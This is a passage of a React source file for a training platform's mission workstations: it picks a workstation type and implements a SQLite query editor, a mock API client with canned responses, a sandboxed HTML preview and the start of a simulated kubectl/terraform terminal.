/**
 * ArenaWorkstations.jsx
 * Workstation components for each Arena mission type.
 * WorkstationRouter picks the right workstation based on mission type.
 *
 * Exports:
 *   resolveWorkstationType(mission) → string
 *   WorkstationRouter({ mission, domain, code, onCodeChange, ... })
 */

import React, { useState, useRef, useEffect, useCallback } from "react"
import {
  runQuery, getSchema, getDataQuality, validateMetrics, registerValidator,
  registerRunner, registerProofProvider, runPython, formatCell, formatMetric,
} from "../services/workstationEngine"

// ─────────────────────────────────────────────────────────────────────────────
// THEME (matches Arena.jsx T)
// ─────────────────────────────────────────────────────────────────────────────
const T = {
  bg:      "#F8F7F4",
  bg2:     "#F1EFE9",
  ink:     "#1A1714",
  ink2:    "#4A4540",
  ink3:    "#9A948E",
  cream2:  "#EBE8E1",
  green:   "#2D8653",
  green2:  "#E6F4ED",
  amber:   "#C07820",
  red:     "#D14343",
  blue:    "#1E62B5",
  blue2:   "#E8F0FB",
  purple:  "#6B3FA0",
  indigo:  "#4F46E5",
  ink4:    "#B5AFA8",
  border:  "#E2DED7",
  code:    "#F7F6F3",
}

// ─────────────────────────────────────────────────────────────────────────────
// RESOLVE WORKSTATION TYPE FROM MISSION
// ─────────────────────────────────────────────────────────────────────────────
// Category → workstation type mapping for non-IT streams
const ENGINEERING_CATEGORIES = new Set(["ECE","EEE","Mechanical","Civil","Pharmacy","MBA","IoT"])
const CALCULATOR_CATEGORIES  = new Set(["Aptitude","Logical"])

export function resolveWorkstationType(mission) {
  if (!mission) return "code"

  // Domain-specific engineering lab workstation
  if (ENGINEERING_CATEGORIES.has(mission.category)) return "engineering_lab"
  // Calculator (formula answer input) for Aptitude / Logical Reasoning
  const langs = mission.languages || mission.language_tags || []
  if (langs.includes("calculator")) return "calculator"
  if (CALCULATOR_CATEGORIES.has(mission.category)) return "calculator"

  // Explicit field wins
  const mt = (mission.missionType || "").toLowerCase()
  if (mt) {
    if (mt === "sql"      || mt === "data")     return "sql"
    if (mt === "api"      || mt === "http")     return "api"
    if (mt === "frontend" || mt === "react"
                          || mt === "ui")       return "frontend"
    if (mt === "terminal" || mt === "bash"
                          || mt === "devops")   return "terminal"
    if (mt === "notebook" || mt === "python"
                          || mt === "jupyter")  return "notebook"
    if (mt === "markdown" || mt === "docs")                    return "markdown"
    if (mt === "excel"    || mt === "spreadsheet")             return "excel"
    if (mt === "dashboard"|| mt === "powerbi" || mt === "bi") return "dashboard"
    if (mt === "report"   || mt === "analysis")                return "report"
    if (mt === "code"     || mt === "swe")                     return "code"
    if (mt === "system_design" || mt === "architecture" || mt === "design") return "system_design"
  }

  // Derive from sandbox
  const sb = (mission.sandbox || "").toLowerCase()
  if (sb === "sql"  || sb === "data")                return "sql"
  if (sb === "react"|| sb === "frontend")            return "frontend"
  if (sb === "terminal")                             return "terminal"
  if (sb === "notebook")                             return "notebook"
  if (sb === "markdown")                             return "markdown"
  if (sb === "diagram" || sb === "system_design")    return "system_design"   // was wrongly "markdown"
  if (sb === "excel"    || sb === "spreadsheet")     return "excel"
  if (sb === "dashboard"|| sb === "powerbi")         return "dashboard"
  if (sb === "report")                               return "report"
  // Specialized consoles — pass sandbox value through directly
  if (sb === "security_console")                     return "security_console"
  if (sb === "soc_console")                          return "soc_console"
  if (sb === "sre_console")                          return "sre_console"
  if (sb === "qa_lab")                               return "qa_lab"
  if (sb === "business_analysis")                    return "business_analysis"
  if (sb === "medical_coding")                       return "medical_coding"

  // Derive from title / category / description keywords
  const text = ((mission.title || "") + " " + (mission.category || "") + " " + (mission.description || "")).toLowerCase()
  if (/\bsql\b|query|select|insert|join|database/.test(text))         return "sql"
  // ── DevOps / Kubernetes / IaC — MUST come before api check because K8s uses HTTP probes ──
  if (/\bkubernetes\b|\bkubectl\b|\bk8s\b|\bhelm\b|kind:\s*(deployment|service|configmap|ingress|hpa|pod)|apiversion:\s*apps|yaml.*manifest|manifest.*yaml|dockerfile|docker[\s-]?compose|terraform|ansible|ci[\s/]?cd|github.*action|jenkinsfile|rolling.*update|horizontal.*pod|pod.*autoscaler|liveness.*probe|readiness.*probe|resource.*limit|replica/.test(text)) return "code"
  if (/\bapi\b|rest|http|endpoint|fetch|curl|request/.test(text))     return "api"
  if (/\breact\b|jsx|css|html|frontend|component|dom/.test(text))     return "frontend"
  if (/\bbash\b|shell|terminal|command|linux|script/.test(text))      return "terminal"
  if (/notebook|pandas|dataframe|matplotlib|python/.test(text))       return "notebook"
  if (/\bexcel\b|spreadsheet|vlookup|pivot table|xlookup/.test(text)) return "excel"
  if (/\bdashboard\b|power\s?bi|tableau|kpi|chart|metric/.test(text)) return "dashboard"
  if (/analysis report|executive summary|findings|recommendations/.test(text)) return "report"
  if (/\bmarkdown\b|readme|documentation/.test(text))                 return "markdown"
  if (/system design|architecture|design a |url shortener|rate limit|chat system|news feed|design.*service/.test(text)) return "system_design"

  return "code"
}

// ─────────────────────────────────────────────────────────────────────────────
// SHARED EDITOR PRIMITIVES
// ─────────────────────────────────────────────────────────────────────────────
const MonoTextarea = ({ value, onChange, placeholder, minHeight = 200, style = {} }) => (
  <textarea
    value={value}
    onChange={e => onChange(e.target.value)}
    placeholder={placeholder}
    spellCheck={false}
    style={{
      width: "100%", height: "100%", minHeight,
      background: T.code, color: T.ink,
      border: "none", outline: "none", resize: "none",
      fontFamily: "'Fira Code', 'Consolas', monospace", fontSize: 12, lineHeight: 1.6,
      padding: "12px 14px", boxSizing: "border-box",
      ...style,
    }}
  />
)

const PanelHeader = ({ children, color = T.ink3, bg = T.bg2, actions }) => (
  <div style={{
    display: "flex", alignItems: "center", justifyContent: "space-between",
    padding: "5px 12px", borderBottom: `1px solid ${T.border}`,
    background: bg, flexShrink: 0,
  }}>
    <span style={{ fontSize: 10, fontWeight: 700, color, letterSpacing: 0.5, textTransform: "uppercase" }}>{children}</span>
    {actions && <div style={{ display: "flex", gap: 4 }}>{actions}</div>}
  </div>
)

const SmallBtn = ({ onClick, children, active, color }) => (
  <button onClick={onClick} style={{
    padding: "3px 8px", borderRadius: 5, border: `1px solid ${T.border}`,
    background: active ? (color || T.blue) + "18" : T.bg,
    color: active ? (color || T.blue) : T.ink3,
    fontSize: 10, fontWeight: 700, cursor: "pointer",
  }}>{children}</button>
)

// ─────────────────────────────────────────────────────────────────────────────
// 1. SQL WORKSTATION — real SQLite execution (sql.js WASM), seeded per mission
// ─────────────────────────────────────────────────────────────────────────────
function ResultTable({ rs }) {
  return (
    <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 11 }}>
      <thead>
        <tr style={{ background: T.bg2 }}>
          {rs.columns.map(c => (
            <th key={c} style={{ padding: "4px 8px", textAlign: "left", fontWeight: 700, color: T.ink2, borderBottom: `1px solid ${T.border}`, whiteSpace: "nowrap", position: "sticky", top: 0, background: T.bg2 }}>{c}</th>
          ))}
        </tr>
      </thead>
      <tbody>
        {rs.values.map((row, i) => (
          <tr key={i} style={{ borderBottom: `1px solid ${T.border}`, background: i % 2 ? T.bg : T.bg2 }}>
            {row.map((cell, ci) => (
              <td key={ci} style={{ padding: "3px 8px", color: cell === null ? T.red : T.ink2, fontWeight: cell === null ? 700 : 400, whiteSpace: "nowrap" }}>
                {formatCell(cell)}
              </td>
            ))}
          </tr>
        ))}
      </tbody>
    </table>
  )
}

function SqlWorkstation({ mission, code, onCodeChange }) {
  const [schemaInfo, setSchemaInfo] = useState(null)
  const [results, setResults]       = useState(null)   // { resultSets, ms }
  const [sqlError, setSqlError]     = useState(null)
  const [running, setRunning]       = useState(false)
  const [schemaOpen, setSchemaOpen] = useState(true)
  const [engineErr, setEngineErr]   = useState(null)

  useEffect(() => {
    let alive = true
    getSchema(mission)
      .then(s => { if (alive) setSchemaInfo(s) })
      .catch(e => { if (alive) setEngineErr(e.message) })
    return () => { alive = false }
  }, [mission])

  const runSql = useCallback(async () => {
    if (!code?.trim()) return
    setRunning(true); setSqlError(null)
    try {
      const out = await runQuery(mission, code)
      setResults(out)
    } catch (e) {
      setResults(null); setSqlError(e.message)
    }
    setRunning(false)
  }, [mission, code])

  const onKeyDown = e => {
    if ((e.metaKey || e.ctrlKey) && e.key === "Enter") { e.preventDefault(); runSql() }
  }

  // ── shell action bus: ▶ Run Query + proof draft ──
  const busRef = useRef({})
  busRef.current = { runSql, code, results }
  useEffect(() => {
    const unRun = registerRunner(() => busRef.current.runSql())
    const unProof = registerProofProvider(() => {
      const { code: c, results: r } = busRef.current
      const artifacts = []
      if (c?.trim()) artifacts.push({ type: "code", label: "SQL query", content: c })
      if (r?.resultSets?.length) {
        const rs = r.resultSets[0]
        artifacts.push({
          type: "report",
          label: `Query result — ${rs.rowCount} rows in ${r.ms}ms`,
          content: [rs.columns.join("  |  "), "—".repeat(40), ...rs.values.slice(0, 12).map(row => row.map(formatCell).join("  |  "))].join("\n"),
        })
      }
      return { headline: mission?.title || "SQL Lab attempt", artifacts }
    })
    return () => { unRun(); unProof() }
  }, []) // eslint-disable-line

  const totalRows = results ? results.resultSets.reduce((a, r) => a + r.rowCount, 0) : 0

  return (
    <div style={{ flex: 1, display: "flex", overflow: "hidden", minHeight: 0 }}>
      {/* Schema sidebar — introspected from the real database */}
      {schemaOpen && (
        <div style={{ width: 195, flexShrink: 0, borderRight: `1px solid ${T.border}`, display: "flex", flexDirection: "column", overflow: "hidden" }}>
          <PanelHeader color={T.blue}>🗂 Schema (live)</PanelHeader>
          <div style={{ overflow: "auto", padding: "8px 10px" }}>
            {!schemaInfo && !engineErr && <div style={{ fontSize: 10, color: T.ink3 }}>Loading database…</div>}
            {engineErr && <div style={{ fontSize: 10, color: T.red }}>DB failed to load: {engineErr}</div>}
            {(schemaInfo || []).map(t => (
              <div key={t.table} style={{ marginBottom: 10 }}>
                <div style={{ fontSize: 11, fontWeight: 800, color: T.ink, marginBottom: 3 }}>
                  📋 {t.table} <span style={{ fontWeight: 400, color: T.ink3 }}>({t.rowCount.toLocaleString()} rows)</span>
                </div>
                {t.columns.map(c => (
                  <div key={c.name} style={{ fontSize: 10, color: T.ink3, paddingLeft: 10, marginBottom: 1 }}>
                    <span style={{ color: T.blue, fontFamily: "monospace" }}>{c.name}</span>
                    <span style={{ marginLeft: 5, color: T.ink3, fontSize: 9 }}>{c.type}</span>
                  </div>
                ))}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Editor + results */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }} onKeyDown={onKeyDown}>
        <PanelHeader color={T.green} actions={[
          <SmallBtn key="schema" onClick={() => setSchemaOpen(o => !o)}>{schemaOpen ? "◀ Schema" : "▶ Schema"}</SmallBtn>,
          <SmallBtn key="run" onClick={runSql} active color={T.green}>{running ? "⟳ Running…" : "▶ Run Query (⌘↵)"}</SmallBtn>,
        ]}>SQL Editor — SQLite</PanelHeader>

        <div style={{ flex: 1, overflow: "hidden", minHeight: 0, display: "flex", flexDirection: "column" }}>
          <div style={{ flex: "0 0 50%", overflow: "hidden" }}>
            <MonoTextarea
              value={code}
              onChange={onCodeChange}
              placeholder={"-- Your SQL runs against a real SQLite database.\n-- Tables: orders, products, customers (see schema panel)\nSELECT * FROM orders LIMIT 10;"}
            />
          </div>

          <div style={{ flex: 1, borderTop: `1px solid ${T.border}`, overflow: "auto", background: T.bg }}>
            <PanelHeader color={sqlError ? T.red : T.ink3}>
              {running ? "⟳ Executing…"
                : sqlError ? "✗ SQL Error"
                : results ? `✓ ${results.resultSets.length} result set${results.resultSets.length === 1 ? "" : "s"} — ${totalRows} rows in ${results.ms}ms`
                : "Results"}
            </PanelHeader>
            {/* Single output slot — all variants at ONE fiber position to prevent
                React insertBefore NotFoundError when batched state updates remove
                the placeholder AND insert results in the same commit pass. */}
            {running ? null
              : sqlError ? (
                <div key="sql-error" style={{ padding: "10px 14px", fontFamily: "monospace", fontSize: 11, color: T.red, whiteSpace: "pre-wrap" }}>{sqlError}</div>
              ) : results ? (
                results.resultSets.length === 0 ? (
                  <div key="empty-result" style={{ padding: 16, color: T.ink3, fontSize: 11 }}>Statement executed — no rows returned.</div>
                ) : (
                  <div key="result-rows">
                    {results.resultSets.map((rs, i) => (
                      <div key={i} style={{ marginBottom: 8 }}>
                        {results.resultSets.length > 1 && (
                          <div style={{ padding: "4px 10px", fontSize: 9, fontWeight: 800, color: T.ink3, textTransform: "uppercase", letterSpacing: 0.6, background: T.bg }}>
                            Result {i + 1} — {rs.rowCount} rows{rs.truncated ? " (showing first 500)" : ""}
                          </div>
                        )}
                        <ResultTable rs={rs} />
                      </div>
                    ))}
                  </div>
                )
              ) : (
                <div key="sql-placeholder" style={{ padding: 16, color: T.ink3, fontSize: 11 }}>Write SQL above and press ▶ Run Query — it executes for real against the seeded database.</div>
              )
            }
          </div>
        </div>
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. API WORKSTATION
// ─────────────────────────────────────────────────────────────────────────────
function ApiWorkstation({ mission, code, onCodeChange }) {
  const [method, setMethod]     = useState("GET")
  const [url, setUrl]           = useState("https://api.example.com/users")
  const [bodyTab, setBodyTab]   = useState("body")   // body | headers | response
  const [sending, setSending]   = useState(false)
  const [response, setResponse] = useState(null)

  const methods = ["GET","POST","PUT","PATCH","DELETE"]
  const methodColor = { GET: T.green, POST: T.blue, PUT: T.amber, PATCH: T.purple, DELETE: T.red }

  const sendRequest = () => {
    setSending(true)
    setBodyTab("response")

    // Derive a realistic response from the URL path + HTTP method
    const deriveMockBody = (urlStr, httpMethod) => {
      let path = ""
      try { path = new URL(urlStr).pathname } catch { path = urlStr }
      const seg = path.replace(/^\//, "").split("/")
      const resource = seg[0] || ""
      const id = seg[1]
      const isGet = httpMethod === "GET"
      const isList = isGet && !id
      const ts = new Date().toISOString()

      // ── /users, /accounts ─────────────────────────────────────────────────
      if (/users?|accounts?|members?|customers?/.test(resource)) {
        if (httpMethod === "DELETE") return { success: true, message: `User ${id||1} deleted`, deletedAt: ts }
        if (!isGet) return { id: id || Math.floor(Math.random()*9000+1000), name: "Alice Johnson", email: "alice@example.com", role: "user", createdAt: ts }
        if (isList) return { data: [
          { id: 1, name: "Alice Johnson", email: "alice@example.com", role: "admin", status: "active", createdAt: "2024-01-01T00:00:00Z" },
          { id: 2, name: "Bob Smith",     email: "bob@example.com",   role: "user",  status: "active", createdAt: "2024-01-05T00:00:00Z" },
          { id: 3, name: "Carol White",   email: "carol@example.com", role: "user",  status: "inactive",createdAt: "2024-01-10T00:00:00Z" },
        ], total: 3, page: 1, perPage: 20 }
        return { id: id||1, name: "Alice Johnson", email: "alice@example.com", role: "admin", status: "active", lastLogin: ts }
      }

      // ── /orders, /transactions ────────────────────────────────────────────
      if (/orders?|transactions?|purchases?/.test(resource)) {
        if (!isGet) return { id: `ORD-${Math.floor(Math.random()*9000+1000)}`, status: "pending", total: 149.99, currency: "USD", createdAt: ts }
        if (isList) return { data: [
          { id: "ORD-1001", userId: 1, total: 149.99, status: "completed", items: 3, createdAt: "2024-01-15T10:23:00Z" },
          { id: "ORD-1002", userId: 2, total: 89.00,  status: "pending",   items: 1, createdAt: "2024-01-15T11:40:00Z" },
          { id: "ORD-1003", userId: 1, total: 299.50, status: "shipped",   items: 5, createdAt: "2024-01-14T08:10:00Z" },
        ], total: 3, page: 1 }
        return { id: id||"ORD-1001", userId: 1, total: 149.99, status: "completed", items: [
          { productId: 42, name: "Wireless Keyboard", qty: 1, price: 79.99 },
          { productId: 17, name: "USB Hub", qty: 2, price: 35.00 },
        ], createdAt: "2024-01-15T10:23:00Z" }
      }

      // ── /products, /items ─────────────────────────────────────────────────
      if (/products?|items?|catalog|inventory/.test(resource)) {
        if (!isGet) return { id: Math.floor(Math.random()*9000+1000), name: "New Product", price: 99.99, stock: 100, createdAt: ts }
        if (isList) return { data: [
          { id: 1, name: "Wireless Keyboard", price: 79.99, stock: 45, category: "peripherals" },
          { id: 2, name: "Mechanical Mouse",  price: 49.99, stock: 120, category: "peripherals" },
          { id: 3, name: "USB-C Hub",         price: 35.00, stock: 200, category: "accessories" },
        ], total: 3 }
        return { id: id||1, name: "Wireless Keyboard", price: 79.99, stock: 45, category: "peripherals", sku: "KB-WL-001" }
      }

      // ── /auth, /login, /token ─────────────────────────────────────────────
      if (/auth|login|token|refresh|signup|register/.test(resource)) {
        if (httpMethod === "DELETE" || resource === "logout") return { success: true, message: "Logged out" }
        return {
          accessToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNzA1MzE2ODAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
          refreshToken: "dGhpcyBpcyBhIHJlZnJlc2ggdG9rZW4=",
          expiresIn: 3600, tokenType: "Bearer",
          user: { id: 1, name: "Alice Johnson", email: "alice@example.com", role: "admin" }
        }
      }

      // ── /health, /status, /ping ───────────────────────────────────────────
      if (/health|status|ping|ready|live/.test(resource)) {
        return { status: "healthy", uptime: Math.floor(Math.random()*86400), version: "1.2.3",
          checks: { database: "up", cache: "up", queue: "up" } }
      }

      // ── /metrics, /analytics, /reports ───────────────────────────────────
      if (/metrics?|analytics?|reports?|stats?/.test(resource)) {
        return { period: "2024-01", totalUsers: 12450, activeUsers: 8234,
          revenue: 145230.50, orders: 3421, conversionRate: 0.034,
          generatedAt: ts }
      }

      // ── /search ───────────────────────────────────────────────────────────
      if (/search|query/.test(resource)) {
        return { results: [
          { id: 1, title: "Result 1", relevance: 0.95 },
          { id: 2, title: "Result 2", relevance: 0.87 },
        ], total: 2, took: "12ms" }
      }

      // ── Default ───────────────────────────────────────────────────────────
      if (httpMethod === "DELETE") return { success: true, deletedAt: ts }
      if (!isGet) return { id: Math.floor(Math.random()*9000+1000), success: true, message: "Created successfully", createdAt: ts }
      return { data: [{ id: 1, name: "Resource A" }, { id: 2, name: "Resource B" }], total: 2 }
    }

    setTimeout(() => {
      const isError = method === "DELETE" && !url.includes("/") // edge case demo
      const statusCode = isError ? 422 : method === "POST" ? 201 : method === "DELETE" ? 204 : 200
      const statusText = { 200: "OK", 201: "Created", 204: "No Content", 404: "Not Found", 422: "Unprocessable Entity" }[statusCode] || "OK"
      const body = statusCode === 204 ? "" : JSON.stringify(deriveMockBody(url, method), null, 2)

      setResponse({
        status: statusCode,
        statusText,
        time: `${Math.floor(Math.random() * 120 + 18)}ms`,
        size: `${body.length} B`,
        headers: { "content-type": "application/json", "x-request-id": Math.random().toString(36).slice(2,10), "x-ratelimit-remaining": "98" },
        body,
      })
      setSending(false)
    }, Math.floor(Math.random() * 400 + 400))
  }

  return (
    <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", minHeight: 0 }}>
      {/* URL bar */}
      <div style={{ padding: "8px 12px", borderBottom: `1px solid ${T.border}`, background: T.bg2, display: "flex", gap: 8, flexShrink: 0 }}>
        <select value={method} onChange={e => setMethod(e.target.value)} style={{
          padding: "4px 8px", border: `1px solid ${T.border}`, borderRadius: 6,
          fontWeight: 800, fontSize: 11, color: methodColor[method] || T.ink,
          background: T.bg, cursor: "pointer",
        }}>
          {methods.map(m => <option key={m}>{m}</option>)}
        </select>
        <input
          value={url} onChange={e => setUrl(e.target.value)}
          style={{ flex: 1, padding: "4px 10px", border: `1px solid ${T.border}`, borderRadius: 6, fontSize: 11, fontFamily: "monospace", outline: "none" }}
          placeholder="https://api.example.com/endpoint"
        />
        <button onClick={sendRequest} style={{
          padding: "4px 14px", borderRadius: 6, border: "none",
          background: T.blue, color: "#fff", fontSize: 11, fontWeight: 700, cursor: "pointer",
        }}>
          {sending ? "⟳" : "Send ▶"}
        </button>
      </div>

      {/* Tabs */}
      <div style={{ display: "flex", gap: 0, borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
        {[["body","Body"],["headers","Headers"],["response","Response"]].map(([id,label]) => (
          <button key={id} onClick={() => setBodyTab(id)} style={{
            padding: "6px 14px", border: "none", borderBottom: bodyTab === id ? `2px solid ${T.blue}` : "2px solid transparent",
            background: "transparent", fontSize: 11, fontWeight: bodyTab === id ? 800 : 500,
            color: bodyTab === id ? T.blue : T.ink3, cursor: "pointer",
          }}>{label}</button>
        ))}
      </div>

      {/* Tab content */}
      <div style={{ flex: 1, overflow: "hidden", minHeight: 0 }}>
        {bodyTab === "body" && (
          <MonoTextarea
            value={code}
            onChange={onCodeChange}
            placeholder={`// Request body (JSON)\n{\n  "name": "Alice",\n  "email": "alice@example.com"\n}`}
          />
        )}
        {bodyTab === "headers" && (
          <div style={{ padding: 12, fontFamily: "monospace", fontSize: 11, color: T.ink2 }}>
            <div style={{ marginBottom: 8, color: T.ink3, fontSize: 10, fontWeight: 700 }}>REQUEST HEADERS</div>
            {[["Content-Type","application/json"],["Accept","application/json"],["Authorization","Bearer <token>"]].map(([k,v]) => (
              <div key={k} style={{ display: "flex", gap: 8, marginBottom: 6 }}>
                <input defaultValue={k} style={{ width: 180, padding: "3px 7px", border: `1px solid ${T.border}`, borderRadius: 5, fontSize: 11 }} />
                <input defaultValue={v} style={{ flex: 1, padding: "3px 7px", border: `1px solid ${T.border}`, borderRadius: 5, fontSize: 11 }} />
              </div>
            ))}
          </div>
        )}
        {bodyTab === "response" && (
          response ? (
            <div style={{ height: "100%", overflow: "auto" }}>
              <div style={{ padding: "6px 12px", background: response.status >= 400 ? "#FEF2F2" : T.green2, borderBottom: `1px solid ${T.border}`, display: "flex", gap: 12, alignItems: "center", flexShrink: 0 }}>
                <span style={{ fontSize: 12, fontWeight: 800, color: response.status >= 400 ? T.red : T.green }}>{response.status >= 400 ? "✗" : "✓"} {response.status} {response.statusText}</span>
                <span style={{ fontSize: 10, color: T.ink3 }}>⏱ {response.time}</span>
                {response.size && <span style={{ fontSize: 10, color: T.ink3 }}>📦 {response.size}</span>}
              </div>
              <pre style={{ margin: 0, padding: "10px 14px", fontSize: 11, color: T.ink, background: T.code, overflow: "auto", flex: 1 }}>
                {response.body}
              </pre>
            </div>
          ) : (
            <div style={{ padding: 16, color: T.ink3, fontSize: 11 }}>Send a request to see the response</div>
          )
        )}
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. FRONTEND WORKSTATION  (editor left + live preview right)
// ─────────────────────────────────────────────────────────────────────────────
function FrontendWorkstation({ mission, code, onCodeChange }) {
  const [previewSrc, setPreviewSrc] = useState("")
  const [layout, setLayout]         = useState("split") // split | editor | preview
  const iframeRef                   = useRef(null)

  const buildPreview = useCallback((src) => {
    const isJsx = src.includes("export default") || src.includes("import React")
    const html = isJsx
      ? `<!DOCTYPE html><html><head><style>body{margin:0;font-family:sans-serif;}</style></head><body>
          <div id="root"></div>
          <script>
            // Simplified JSX preview fallback
            document.getElementById('root').innerHTML = '<div style="padding:20px;color:#555;font-family:monospace;font-size:12px">JSX preview requires a build step.<br/>Submit your code to evaluate it.</div>'
          </script></body></html>`
      : `<!DOCTYPE html><html><head><style>body{margin:0;font-family:sans-serif;}</style></head><body>${src}</body></html>`
    return "data:text/html;charset=utf-8," + encodeURIComponent(html)
  }, [])

  const refresh = () => setPreviewSrc(buildPreview(code))

  useEffect(() => { setPreviewSrc(buildPreview(code)) }, []) // eslint-disable-line

  const editorVisible  = layout !== "preview"
  const previewVisible = layout !== "editor"

  return (
    <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", minHeight: 0 }}>
      <PanelHeader color={T.purple} actions={[
        <SmallBtn key="split"   active={layout==="split"}   onClick={() => setLayout("split")}   color={T.purple}>Split</SmallBtn>,
        <SmallBtn key="editor"  active={layout==="editor"}  onClick={() => setLayout("editor")}  color={T.purple}>Editor</SmallBtn>,
        <SmallBtn key="preview" active={layout==="preview"} onClick={() => setLayout("preview")} color={T.purple}>Preview</SmallBtn>,
        <SmallBtn key="refresh" onClick={refresh} color={T.blue}>↻ Refresh</SmallBtn>,
      ]}>Frontend Workstation</PanelHeader>

      <div style={{ flex: 1, display: "flex", overflow: "hidden", minHeight: 0 }}>
        {editorVisible && (
          <div style={{ flex: 1, overflow: "hidden", borderRight: previewVisible ? `1px solid ${T.border}` : "none" }}>
            <MonoTextarea value={code} onChange={onCodeChange} placeholder="<!-- Write HTML/CSS/JS or React JSX -->" />
          </div>
        )}
        {previewVisible && (
          <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
            <div style={{ padding: "3px 10px", background: T.bg2, borderBottom: `1px solid ${T.border}`, fontSize: 10, color: T.ink3, flexShrink: 0 }}>
              🌐 Preview
            </div>
            <iframe
              ref={iframeRef}
              src={previewSrc}
              title="preview"
              sandbox="allow-scripts"
              style={{ flex: 1, border: "none", background: "#ffffff" }}
            />
          </div>
        )}
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────
// 4. TERMINAL WORKSTATION — domain-aware command simulation
// ─────────────────────────────────────────────────────────────────────────────

// ── kubernetes ──────────────────────────────────────────────────────────────
const _kubectl = (args) => {
  const sub = args[0] || "", res = args[1] || "pods", name = args[2] || ""
  const ns = (() => { const i = args.indexOf("-n"); return i >= 0 ? args[i+1] : "default" })()
  if (sub === "get") {
    if (res === "pods" || res === "pod") return `NAME                                   READY   STATUS    RESTARTS   AGE
nginx-7c79c4bf97-x2k4n                 1/1     Running   0          2d14h
api-server-6d4b8f9d7b-m8j2p            1/1     Running   0          5h23m
worker-5f6b8d9c7d-k9l3q                2/2     Running   1          1d8h
db-postgres-0                          1/1     Running   0          7d
redis-master-0                         1/1     Running   0          3d2h`
    if (res === "nodes" || res === "node") return `NAME             STATUS   ROLES           AGE   VERSION
k8s-master-001   Ready    control-plane   7d    v1.29.0
k8s-worker-001   Ready    <none>          7d    v1.29.0
k8s-worker-002   Ready    <none>          7d    v1.29.0`
    if (res === "deployments" || res === "deploy") return `NAME          READY   UP-TO-DATE   AVAILABLE   AGE
nginx         3/3     3            3           7d
api-server    2/2     2            2           5h23m
worker        4/4     4            4           3d`
    if (res === "svc" || res === "services") return `NAME         TYPE           CLUSTER-IP      EXTERNAL-IP    PORT(S)        AGE
kubernetes   ClusterIP      10.96.0.1       <none>         443/TCP        7d
nginx-svc    LoadBalancer   10.100.200.1    34.123.45.67   80:31000/TCP   7d
api-svc      ClusterIP      10.100.200.2    <none>         3000/TCP       5h23m`
    return `No resources found in ${ns} namespace.`
  }
  if (sub === "describe") return `Name:         ${name || "api-server-6d4b8f9d7b-m8j2p"}
Namespace:    ${ns}
Labels:       app=api-server,version=v1
Status:       Running
IP:           10.244.1.42
Containers:
  main:
    Image:    node:20-alpine
    Port:     3000/TCP
    CPU:      100m / 500m   Memory: 128Mi / 512Mi
    State:    Running (started: 5h23m ago)
    Readiness: True (http-get :3000/health)`
  if (sub === "logs") return `2024-01-15T10:23:14Z [INFO]  Server started on :3000
2024-01-15T10:23:15Z [INFO]  DB pool initialized (10 conns)
2024-01-15T10:24:01Z [INFO]  GET /api/users 200 42ms
2024-01-15T10:24:22Z [INFO]  GET /api/health 200 3ms
2024-01-15T10:25:00Z [ERROR] Connection timeout to redis:6379 (retry 1/3)
2024-01-15T10:25:05Z [INFO]  Redis reconnected`
  if (sub === "rollout") {
    const action = args[1] || "status"
    if (action === "status")  return `deployment "${args[2] || "api-server"}" successfully rolled out`
    if (action === "undo")    return `deployment.apps/${args[2] || "api-server"} rolled back`
    if (action === "restart") return `deployment.apps/${args[2] || "api-server"} restarted`
  }
  if (sub === "apply")  return `configmap/app-config configured\ndeployment.apps/api-server configured\nservice/api-svc unchanged`
  if (sub === "scale")  return `deployment.apps/${name || "api-server"} scaled`
  if (sub === "delete") return `${res}/${name || "resource"} deleted`
  if (sub === "top") {
    if (res === "pods") return `NAME                        CPU(cores)   MEMORY(bytes)\napi-server-6d4b8f9d7b       245m         312Mi\nworker-5f6b8d9c7d           180m         256Mi\ndb-postgres-0               88m          512Mi`
    return `NAME             CPU(cores)   CPU%   MEMORY(bytes)   MEMORY%\nk8s-worker-001   1250m        31%    3.2Gi           82%\nk8s-worker-002   890m         22%    2.8Gi           71%`
  }
  if (sub === "exec")   return `root@${name || "pod"}:/app# `
  return `kubectl controls the Kubernetes cluster manager.\n\nBasic Commands:\n  get          Display one or many resources (pods,nodes,svc,deploy,ns)\n  describe     Show details of a specific resource\n  logs         Print the logs for a container in a pod\n  exec         Execute a command in a container\n  apply        Apply a configuration to a resource\n  delete       Delete resources\n  rollout      Manage the rollout (status|undo|restart)\n  scale        Scale a deployment\n  top          Show resource usage\n\nExamples:\n  kubectl get pods -n production\n  kubectl describe pod api-server-xxx\n  kubectl logs api-server-xxx --previous\n  kubectl rollout restart deploy/api-server`
}

// ── terraform ───────────────────────────────────────────────────────────────
const _terraform = (args) => {
  const sub = args[0] || ""
  if (sub === "init")     return `Initializing the backend...\nInitializing provider plugins...\n- Finding hashicorp/aws versions matching "~> 5.0"...\n- Installing hashicorp/aws v5.31.0...\n\nTerraform has been successfully initialized!`
  if (sub === "plan")     return `Terraform will perform the following actions:\n\n  # aws_instance.web will be created\n  + resource "aws_instance" "web" {\n      + ami           = "ami-0c55b159cbfafe1d0"\n      + instance_type = "t3.micro"\n      + tags = { "Name" = "web-server", "Env" = "prod" }\n    }\n\n  # aws_security_group.web_sg will be created\n  + resource "aws_security_group" "web_sg" {\n      + ingress port 80 from 0.0.0.0/0\n      + ingress port 443 from 0.0.0.0/0\n    }\n\nPlan: 2 to add, 0 to change, 0 to destroy.`
